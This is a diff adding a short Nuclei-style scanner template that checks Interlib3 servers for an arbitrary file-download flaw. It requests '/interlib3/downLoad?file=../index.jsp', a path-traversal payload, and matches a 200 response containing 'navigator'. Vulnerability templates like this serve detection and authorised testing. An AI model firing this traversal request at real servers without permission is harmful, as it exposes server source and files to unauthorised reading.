@@ -1,0 +1,24 @@
+id: interlib3-downLoadfile
+
+info:
+  name: interlib3-downLoadfile
+  author: web
+  severity: high
+  tags: interlib3-downLoadfile
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/interlib3/downLoad?file=../index.jsp"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "navigator"
+        condition: or
+
+      - type: status
+        status:
+          - 200
